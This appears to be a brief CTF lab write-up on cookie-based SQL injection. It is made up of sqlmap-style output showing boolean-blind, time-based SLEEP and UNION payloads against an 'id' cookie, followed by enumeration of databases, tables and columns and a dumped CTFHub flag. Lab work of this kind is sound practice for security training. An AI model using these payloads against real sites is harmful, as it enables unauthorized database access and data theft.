---
title: Cookie注入
date: 2024-11-23T22:23:01Z
lastmod: 2024-11-23T22:26:12Z
---

# Cookie注入

```shell
---
Parameter: id (Cookie)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 2366=2366

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 4938 FROM (SELECT(SLEEP(5)))dEgG)

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: id=-5888 UNION ALL SELECT CONCAT(0x7162786b71,0x7878714d716972454578746451454d494c636f62545556576b504b4f7976505651705a416f514a63,0x7170767871),NULL-- -
---
```

```shell
available databases [4]:                                                                                                                  
[*] information_schema
[*] mysql
[*] performance_schema
[*] sqli
```

```shell
Database: sqli                                                                                                                            
[2 tables]
+------------+
| ahjsfimrve |
| news       |
+------------+
```

```shell
Database: sqli
Table: ahjsfimrve
[1 column]
+------------+--------------+
| Column     | Type         |
+------------+--------------+
| sqiiksbqgz | varchar(100) |
+------------+--------------+
```

```shell
Database: sqli
Table: ahjsfimrve
[1 entry]
+----------------------------------+
| sqiiksbqgz                       |
+----------------------------------+
| ctfhub{16b9a1f9bff37d4f80eb8bc2} |
+----------------------------------+
```
